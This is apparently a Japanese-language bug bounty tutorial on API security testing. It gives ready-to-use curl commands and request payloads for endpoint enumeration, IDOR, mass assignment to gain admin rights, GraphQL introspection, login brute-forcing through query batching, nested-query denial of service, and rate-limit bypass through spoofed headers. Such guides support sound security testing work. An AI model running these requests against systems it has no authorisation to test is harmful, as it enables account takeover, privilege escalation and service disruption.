API Security Testing

REST, GraphQL, gRPC -- API は現代 Web の心臓部。認可不備、情報漏洩、ロジック欠陥の宝庫。

Theory Practice

REST API Testing

Endpoint Enumeration

API の全 endpoint を把握することが最初のステップ。

# Swagger/OpenAPI spec の探索
curl https://target.com/swagger.json
curl https://target.com/api/swagger.json
curl https://target.com/v1/api-docs
curl https://target.com/openapi.json
curl https://target.com/.well-known/openapi.yaml

# ffuf で API path brute force
ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt
ffuf -u https://target.com/api/v1/FUZZ -w api-wordlist.txt

HTTP Method Testing

GET しかドキュメント化されていない endpoint に PUT/DELETE/PATCH を送る。

# 全メソッドを試す
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -o /dev/null -w "%{http_code}" -X $method \
    https://target.com/api/v1/users/123
done

# OPTIONS で許可メソッドを確認
curl -X OPTIONS https://target.com/api/v1/users -i
# Allow: GET, POST, PUT, DELETE

Parameter Tampering

# IDOR: 自分の ID を他人の ID に変更
GET /api/v1/users/MY_ID/documents  → 200
GET /api/v1/users/OTHER_ID/documents  → 200 (IDOR!)

# 権限昇格: role パラメータの追加
POST /api/v1/register
{"username":"test","email":"test@test.com","role":"admin"}

# Hidden parameter: フロントが送らないパラメータを追加
PUT /api/v1/profile
{"name":"test","is_verified":true,"is_admin":true}

Mass Assignment

API が受け取るパラメータを制限していない場合、 意図しないフィールドを書き換えられる。 

# 通常のプロフィール更新
PUT /api/profile {"name":"new name"}

# Mass Assignment 試行
PUT /api/profile {"name":"new name","role":"admin","balance":99999}

# 発見方法: レスポンスに含まれるが送信していないフィールドを列挙
# そのフィールドを送信時に含めてみる

GraphQL Security Testing

Introspection Query

GraphQL のスキーマ全体を取得する最初のステップ。本番で無効化されていないことが多い。

# Full introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'

# Query/Mutation 一覧取得
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}'

Field Suggestion (Introspection 無効時)

# 存在しないフィールドを送ると候補が返ることがある
{"query":"{ usr }"}
# → "Did you mean 'user'?"

# clairvoyance - 自動で field suggestion からスキーマ復元
python3 clairvoyance.py https://target.com/graphql

Authorization Per-Field

# 一般ユーザーで admin-only フィールドにアクセス
{
  user(id: "123") {
    name
    email
    ssn           # admin-only field?
    creditCard    # admin-only field?
    internalNotes # admin-only field?
  }
}

Batching Attacks

# 同一リクエストで複数クエリ (rate limit bypass)
[
  {"query":"mutation { login(email:\"a@b.com\",pass:\"0000\") { token } }"},
  {"query":"mutation { login(email:\"a@b.com\",pass:\"0001\") { token } }"},
  {"query":"mutation { login(email:\"a@b.com\",pass:\"0002\") { token } }"}
]

# Alias を使った batching
{
  a0: login(email:"a@b.com", pass:"0000") { token }
  a1: login(email:"a@b.com", pass:"0001") { token }
  a2: login(email:"a@b.com", pass:"0002") { token }
}

Nested Query DoS

# 深くネストされたクエリでサーバーリソースを消費
{
  user(id:"1") {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}
BB視点: GraphQL IDOR の実例

HackerOne で高額報酬を得た多くの report は GraphQL の認可不備。 node(id: "ENCODED_ID") パターンで他ユーザーのオブジェクトにアクセスするケースが典型。 ID は Base64 decode すると "User:12345" のような形式が多い。

API Versioning Bypass

新しいバージョンで修正された脆弱性が古いバージョンに残っていることがある。 

# バージョンパスの探索
/api/v1/users    # 現行バージョン
/api/v2/users    # 新バージョン (機能制限あり?)
/api/v0/users    # 旧バージョン (認証なし?)
/api/internal/users  # 内部用 (認証なし?)
/api/beta/users  # ベータ版
/api/legacy/users

# ヘッダーでバージョン指定
curl -H "Api-Version: 1.0" https://target.com/api/users
curl -H "X-API-Version: 2021-01-01" https://target.com/api/users
curl -H "Accept: application/vnd.target.v1+json" https://target.com/api/users

Rate Limiting Bypass

# IP rotation headers
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12

# Case variation
POST /api/login
POST /Api/Login
POST /API/LOGIN

# Path manipulation
POST /api/login
POST /api/./login
POST /api/login/
POST /api//login

# HTTP method change (if both work)
POST /api/login → PUT /api/login

# Parameter pollution
POST /api/login?param=1
POST /api/login?param=2

Swagger/OpenAPI Spec Analysis

Swagger spec が見つかった場合、ドキュメント化された endpoint と実際の endpoint を比較する。 undocumented endpoint は認証が甘い傾向にある。 

# Swagger spec から全 endpoint 抽出
cat swagger.json | jq '.paths | keys[]'

# bearerAuth が定義されているのに実際は認証なしの endpoint を探す
# → spec と実装の乖離 = vulnerability

# Swagger UI が公開されている場合
# https://target.com/swagger-ui/
# "Try it out" で直接 API を叩ける

Key Takeaways

  • Introspection は最初に試す — GraphQL のスキーマが全て見える可能性
  • 古いバージョンを狙う — v1 に認証バイパスが残っていることがある
  • レスポンスフィールドを全て読む — 送っていないフィールドが返る = Mass Assignment 候補
  • Batching は Rate Limit の天敵 — GraphQL の alias/array batching
  • Swagger は攻撃者の味方 — 開発者向けドキュメントが攻撃の地図になる
